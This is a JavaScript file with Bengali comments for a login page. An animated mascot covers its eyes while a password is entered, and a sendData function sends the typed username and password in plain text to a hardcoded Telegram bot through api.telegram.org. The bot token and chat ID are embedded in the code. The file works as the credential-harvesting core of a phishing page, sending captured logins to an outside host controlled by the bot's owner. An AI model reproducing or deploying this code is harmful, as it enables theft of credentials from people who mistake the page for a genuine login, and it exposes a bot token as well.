// Mascot এবং Input এলিমেন্ট সিলেক্ট করা
const img = document.getElementById('mascot-img');
const pass = document.getElementById('password');
const btn = document.querySelector('button');

// ইমেজগুলোর সোর্স (আপনার ফাইলের নামের সাথে মিল রেখে)
const poses = {
    idle: '1000022715.jpg',
    covering: '1000022716.jpg',
    peeking: '1000022717.jpg'
};

// ১. পাসওয়ার্ড বক্সে ক্লিক করলে (Focus)
pass.addEventListener('focus', () => {
    img.src = poses.covering;
});

// ২. পাসওয়ার্ড বক্স থেকে বেরিয়ে গেলে (Blur)
pass.addEventListener('blur', () => {
    img.src = poses.idle;
});

// ৩. পাসওয়ার্ড টাইপ করলে আঙুল ফাঁক করে দেখা (Peeking)
pass.addEventListener('input', () => {
    if (pass.value.length > 0) {
        img.src = poses.peeking;
    } else {
        img.src = poses.covering;
    }
});

// ৪. টেলিগ্রাম বট ফাংশন (Data Transmission)
function sendData() {
    const user = document.getElementById('username').value;
    const passVal = pass.value;

    // ভ্যালিডেশন চেক
    if (user === "" || passVal === "") {
        alert("Please enter your credentials!");
        return;
    }

    // বাটন লোডিং স্টেট
    btn.innerText = "AUTHENTICATING...";
    btn.style.background = "#ffaa00";

    const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
    const chatId = "7950771882";
    
    // টেলিগ্রাম এপিআই কল
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=👤 User: ${user}%0A🔑 Pass: ${passVal}`;
    
    fetch(url)
    .then(response => {
        if (response.ok) {
            btn.innerText = "ACCESS GRANTED";
            btn.style.background = "#00ff88";
            alert("Login data synced to Telegram!");
        } else {
            throw new Error('Failed to connect');
        }
    })
    .catch(error => {
        btn.innerText = "CONNECTION ERROR";
        btn.style.background = "#ff0055";
        console.error('Error:', error);
    });
}
